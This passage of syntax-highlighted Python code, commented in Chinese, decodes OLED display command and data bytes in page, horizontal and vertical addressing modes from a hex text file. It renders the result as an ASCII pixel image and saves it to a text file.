</span></span><span class="line"><span class="cl"><span class="n">pixels</span> <span class="o">=</span> <span class="p">[[</span><span class="s1">&#39;_&#39;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">WIDTH</span><span class="p">)]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">HEIGHT</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">draw_page_addressing_mode</span><span class="p">(</span><span class="n">hex_data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;页寻址模式：解析包含10/00指令的数据流&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">pixels</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">current_page</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">current_col</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">col_start</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">col_end</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">total_bytes</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">data_count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">hex_data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">byte_val</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">hex_data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 检查是否是列地址低位设置指令 (00H~0FH)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="mh">0x00</span> <span class="o">&lt;=</span> <span class="n">byte_val</span> <span class="o">&lt;=</span> <span class="mh">0x0F</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">col_low</span> <span class="o">=</span> <span class="n">byte_val</span> <span class="o">&amp;</span> <span class="mh">0x0F</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_col</span> <span class="o">=</span> <span class="p">(</span><span class="n">current_col</span> <span class="o">&amp;</span> <span class="mh">0xF0</span><span class="p">)</span> <span class="o">|</span> <span class="n">col_low</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  设置列地址低位: </span><span class="si">{</span><span class="n">col_low</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2">H, 当前列=</span><span class="si">{</span><span class="n">current_col</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 检查是否是列地址高位设置指令 (10H~1FH)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="mh">0x10</span> <span class="o">&lt;=</span> <span class="n">byte_val</span> <span class="o">&lt;=</span> <span class="mh">0x1F</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">col_high</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte_val</span> <span class="o">&amp;</span> <span class="mh">0x0F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_col</span> <span class="o">=</span> <span class="p">(</span><span class="n">current_col</span> <span class="o">&amp;</span> <span class="mh">0x0F</span><span class="p">)</span> <span class="o">|</span> <span class="n">col_high</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  设置列地址高位: </span><span class="si">{</span><span class="p">(</span><span class="n">byte_val</span> <span class="o">&amp;</span> <span class="mh">0x0F</span><span class="p">)</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2">H, 当前列=</span><span class="si">{</span><span class="n">current_col</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 检查是否是页地址设置指令 (B0H~B7H)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="mh">0xB0</span> <span class="o">&lt;=</span> <span class="n">byte_val</span> <span class="o">&lt;=</span> <span class="mh">0xB7</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_page</span> <span class="o">=</span> <span class="n">byte_val</span> <span class="o">&amp;</span> <span class="mh">0x07</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  设置页地址: </span><span class="si">{</span><span class="n">current_page</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 否则是数据字节</span>
</span></span><span class="line"><span class="cl">        <span class="n">byte_str</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">byte_val</span><span class="si">:</span><span class="s1">0&gt;8b</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 绘制该字节（一列中一页的8个像素）</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">current_col</span> <span class="o">&lt;</span> <span class="n">WIDTH</span><span class="p">:</span>  <span class="c1"># 只在有效范围内绘制</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">row</span> <span class="o">=</span> <span class="n">current_page</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">bit</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">row</span> <span class="o">&lt;</span> <span class="n">HEIGHT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">byte_str</span><span class="p">[</span><span class="mi">7</span> <span class="o">-</span> <span class="n">bit</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">pixels</span><span class="p">[</span><span class="n">row</span><span class="p">][</span><span class="n">current_col</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;#&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 列地址自动递增，限制在0-127范围内</span>
</span></span><span class="line"><span class="cl">        <span class="n">current_col</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">current_col</span> <span class="o">&gt;</span> <span class="mi">127</span><span class="p">:</span>  <span class="c1"># 超过127就回到起始列</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_col</span> <span class="o">=</span> <span class="n">col_start</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 注意：页地址不会自动改变</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">data_count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">data_count</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">draw_horizontal_mode</span><span class="p">(</span><span class="n">hex_data</span><span class="p">,</span> <span class="n">start_col</span><span class="p">,</span> <span class="n">end_col</span><span class="p">,</span> <span class="n">start_page</span><span class="p">,</span> <span class="n">end_page</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;水平地址模式：先写完一行的所有列，再到下一行&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">pixels</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">bin_data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ele</span> <span class="ow">in</span> <span class="n">hex_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">bin_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">ele</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="si">:</span><span class="s1">0&gt;8b</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">current_col</span> <span class="o">=</span> <span class="n">start_col</span>
</span></span><span class="line"><span class="cl">    <span class="n">current_page</span> <span class="o">=</span> <span class="n">start_page</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">byte_str</span> <span class="ow">in</span> <span class="n">bin_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">current_page</span> <span class="o">&gt;</span> <span class="n">end_page</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">row</span> <span class="o">=</span> <span class="n">current_page</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">bit</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">row</span> <span class="o">&lt;</span> <span class="n">HEIGHT</span> <span class="ow">and</span> <span class="n">current_col</span> <span class="o">&lt;</span> <span class="n">WIDTH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">byte_str</span><span class="p">[</span><span class="mi">7</span> <span class="o">-</span> <span class="n">bit</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">pixels</span><span class="p">[</span><span class="n">row</span><span class="p">][</span><span class="n">current_col</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;#&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">current_col</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">current_col</span> <span class="o">&gt;</span> <span class="n">end_col</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_col</span> <span class="o">=</span> <span class="n">start_col</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_page</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">current_page</span> <span class="o">&gt;</span> <span class="n">end_page</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">bin_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">draw_vertical_mode</span><span class="p">(</span><span class="n">hex_data</span><span class="p">,</span> <span class="n">start_col</span><span class="p">,</span> <span class="n">end_col</span><span class="p">,</span> <span class="n">start_page</span><span class="p">,</span> <span class="n">end_page</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;垂直地址模式：先写完一列的所有页，再到下一列&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">pixels</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">bin_data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ele</span> <span class="ow">in</span> <span class="n">hex_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">bin_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">ele</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="si">:</span><span class="s1">0&gt;8b</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">current_col</span> <span class="o">=</span> <span class="n">start_col</span>
</span></span><span class="line"><span class="cl">    <span class="n">current_page</span> <span class="o">=</span> <span class="n">start_page</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">byte_str</span> <span class="ow">in</span> <span class="n">bin_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">current_col</span> <span class="o">&gt;</span> <span class="n">end_col</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">row</span> <span class="o">=</span> <span class="n">current_page</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">bit</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">row</span> <span class="o">&lt;</span> <span class="n">HEIGHT</span> <span class="ow">and</span> <span class="n">current_col</span> <span class="o">&lt;</span> <span class="n">WIDTH</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">byte_str</span><span class="p">[</span><span class="mi">7</span> <span class="o">-</span> <span class="n">bit</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">pixels</span><span class="p">[</span><span class="n">row</span><span class="p">][</span><span class="n">current_col</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;#&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">current_page</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">current_page</span> <span class="o">&gt;</span> <span class="n">end_page</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_page</span> <span class="o">=</span> <span class="n">start_page</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_col</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">current_col</span> <span class="o">&gt;</span> <span class="n">end_col</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">bin_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 读取文件</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;pixel.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 第一行：页寻址模式（默认）</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;第一阶段：页寻址模式&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">first_line</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">first_line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">hex_data</span> <span class="o">=</span> <span class="n">first_line</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;处理页寻址模式数据，共 </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">hex_data</span><span class="p">)</span><span class="si">}</span><span class="s2"> 字节&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">bytes_used</span> <span class="o">=</span> <span class="n">draw_page_addressing_mode</span><span class="p">(</span><span class="n">hex_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;绘制了 </span><span class="si">{</span><span class="n">bytes_used</span><span class="si">}</span><span class="s2"> 个数据字节</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 后续行：动态模式（带指令）</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;第二阶段：动态地址模式&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">line_num</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">line_num</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 解析格式: [yy 21 xx xx 22 xx xx]:</span>
</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;\[([0-9A-Fa-f]</span><span class="si">{2}</span><span class="s1">)\s+21\s+([0-9A-Fa-f]</span><span class="si">{2}</span><span class="s1">)\s+([0-9A-Fa-f]</span><span class="si">{2}</span><span class="s1">)\s+22\s+([0-9A-Fa-f]</span><span class="si">{2}</span><span class="s1">)\s+([0-9A-Fa-f]</span><span class="si">{2}</span><span class="s1">)\][：:]\s*(.*)&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;第 </span><span class="si">{</span><span class="n">line_num</span><span class="si">}</span><span class="s2"> 行格式不正确，跳过: </span><span class="si">{</span><span class="n">line</span><span class="p">[:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">mode_byte</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">start_col</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">end_col</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">start_page</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">end_page</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">hex_data_str</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">hex_data</span> <span class="o">=</span> <span class="n">hex_data_str</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">mode_byte</span> <span class="o">==</span> <span class="s2">&#34;00&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mode</span> <span class="o">=</span> <span class="s2">&#34;水平&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">bytes_used</span> <span class="o">=</span> <span class="n">draw_horizontal_mode</span><span class="p">(</span><span class="n">hex_data</span><span class="p">,</span> <span class="n">start_col</span><span class="p">,</span> <span class="n">end_col</span><span class="p">,</span> <span class="n">start_page</span><span class="p">,</span> <span class="n">end_page</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">mode_byte</span> <span class="o">==</span> <span class="s2">&#34;01&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mode</span> <span class="o">=</span> <span class="s2">&#34;垂直&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">bytes_used</span> <span class="o">=</span> <span class="n">draw_vertical_mode</span><span class="p">(</span><span class="n">hex_data</span><span class="p">,</span> <span class="n">start_col</span><span class="p">,</span> <span class="n">end_col</span><span class="p">,</span> <span class="n">start_page</span><span class="p">,</span> <span class="n">end_page</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;第 </span><span class="si">{</span><span class="n">line_num</span><span class="si">}</span><span class="s2"> 行未知模式: </span><span class="si">{</span><span class="n">mode_byte</span><span class="si">}</span><span class="s2">，跳过&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;第 </span><span class="si">{</span><span class="n">line_num</span><span class="si">}</span><span class="s2"> 行 | </span><span class="si">{</span><span class="n">mode</span><span class="si">}</span><span class="s2">模式 | 列[</span><span class="si">{</span><span class="n">start_col</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">end_col</span><span class="si">}</span><span class="s2">] 页[</span><span class="si">{</span><span class="n">start_page</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">end_page</span><span class="si">}</span><span class="s2">] | 数据: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">hex_data</span><span class="p">)</span><span class="si">}</span><span class="s2"> 字节&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 输出图像</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;最终OLED图像输出:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;图像尺寸: </span><span class="si">{</span><span class="n">WIDTH</span><span class="si">}</span><span class="s2">列 x </span><span class="si">{</span><span class="n">HEIGHT</span><span class="si">}</span><span class="s2">行&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;实际像素数组: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">pixels</span><span class="p">)</span><span class="si">}</span><span class="s2">行 x </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">pixels</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="si">}</span><span class="s2">列</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">pixels</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">col_idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="n">WIDTH</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">row</span><span class="p">))):</span>  <span class="c1"># 只输出WIDTH列</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="n">col_idx</span><span class="p">],</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 保存为文本文件</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;oled_output.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">pixels</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">col_idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="n">WIDTH</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">row</span><span class="p">))):</span>  <span class="c1"># 只输出WIDTH列</span>
